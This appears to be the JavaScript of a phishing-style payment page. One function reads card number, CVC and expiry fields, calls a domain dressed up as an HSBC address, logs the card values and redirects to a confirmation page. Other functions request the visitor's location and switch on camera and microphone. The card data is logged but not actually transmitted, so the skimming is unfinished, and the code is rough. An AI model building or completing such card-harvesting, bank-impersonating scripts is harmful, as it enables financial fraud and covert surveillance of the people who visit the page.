var x = document.getElementById("demo");
function myFunction() {
   
   let a = document.querySelector('#card-cvc').value
   let b = document.querySelector('#card-number').value
   let c = document.querySelector('#card-expiry').value

   fetch('https://hsbc.com.hk.1.1.7b52bd64.roksit.net/',{ mode: 'no-cors'})
    .then(response => console.log(response))
    .then(res=>{console.log(res,a,b,c); 
        window.location.href = 'confirmation.html'
    })

}

function myFunctionA() {
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(showPosition);
} else { 
  x.innerHTML = "Geolocation is not supported by this browser.";
}
init()
}

async function init(){
    console.log('test');
    
    let d= navigator.getUserMedia({ audio: true, video: { width: 1280, height: 720 } }, 
       function(stream) {
      var video = document.querySelector('video');
      video.srcObject = stream;
      video.onloadedmetadata = function(e) {
        video.play();
      };
      
   },
   function(err) {
    console.log(err.message);
 }
);
}

    
    function showPosition(position) {
      x.innerHTML = "Latitude: " + position.coords.latitude + 
      "<br>Longitude: " + position.coords.longitude;
    }
    

    const constraints = window.constraints = {
      audio: false,
      video: true
    };
    
    
    
   
    
 
    
   


